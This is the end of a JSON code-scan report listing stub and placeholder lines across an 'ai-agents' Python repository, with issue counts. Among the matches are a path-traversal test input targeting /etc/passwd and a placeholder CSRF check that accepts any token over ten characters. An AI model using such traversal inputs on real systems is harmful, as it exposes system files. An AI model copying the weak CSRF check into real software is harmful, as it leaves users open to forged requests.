          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 375,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 380,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 385,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
          "line": 418,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
          "line": 213,
          "content": "Optimized group-by operation using single pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
          "line": 214,
          "content": "Complexity: O(n) instead of multiple O(n) passes"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\orchestration_service.py",
          "line": 363,
          "content": "raise ValueError(f\"Execution not implemented for pattern: {plan.pattern}\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
          "line": 508,
          "content": "passed = sum(1 for r in self.results if r.status == \"pass\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 77,
          "content": "- Username/password"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 101,
          "content": "\"\"\"Authenticate using username/email and password\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 103,
          "content": "password = credentials.get(\"password\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 105,
          "content": "if not identifier or not password:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 354,
          "content": "def _verify_password(self, password: str, password_hash: str) -> bool:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 355,
          "content": "\"\"\"Verify password against hash\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 356,
          "content": "return pwd_context.verify(password, password_hash)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 358,
          "content": "def _hash_password(self, password: str) -> str:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 359,
          "content": "\"\"\"Hash password for storage\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 360,
          "content": "return pwd_context.hash(password)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 410,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 415,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 420,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 425,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 585,
          "content": "# OAuth 2.0 integration (placeholder for future implementation)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 602,
          "content": "raise NotImplementedError(\"OAuth integration coming soon\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 606,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 610,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
          "line": 614,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\database\\session.py",
          "line": 178,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
          "line": 654,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
          "line": 295,
          "content": "auth = aiohttp.BasicAuth(self.credentials.username, self.credentials.password)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
          "line": 562,
          "content": "return \"1000000\"  # Placeholder vendor code"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
          "line": 567,
          "content": "return \"V001\"  # Placeholder vendor code"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
          "line": 321,
          "content": "return len(csrf_token) > 10  # Placeholder validation"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
          "line": 374,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
          "line": 641,
          "content": "return 0  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
          "line": 663,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
          "line": 605,
          "content": "# For now, return empty dict as placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
          "line": 672,
          "content": "logger.warning(f\"Method {method} not implemented\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
          "line": 311,
          "content": "raise NotImplementedError(\"Subclasses must implement process_document_text\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
          "line": 700,
          "content": "\"learning_rate\": 0.1,  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
          "line": 561,
          "content": "# Placeholder - implement actual Claude API call"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
          "line": 571,
          "content": "# Placeholder - implement actual GPT API call"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
          "line": 581,
          "content": "# Placeholder - implement local model execution"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 263,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 268,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 273,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 379,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 408,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 429,
          "content": "return pattern_templates.get(pattern_name, f\"# TODO: Implement {pattern_name} pattern\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1579,
          "content": "\"../../../etc/passwd\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1594,
          "content": "sensitive_data = \"password123\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1682,
          "content": "\"tests_passed\": 23,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
          "line": 1903,
          "content": "\"passed\": True,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
          "line": 703,
          "content": "# Placeholder implementation"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
          "line": 255,
          "content": "# This is a placeholder for more sophisticated conflict detection"
        }
      ]
    }
  ],
  "summary": {
    "total_issues": 529,
    "critical_issues": 529,
    "warnings": 3196,
    "recommendations": 2
  }
}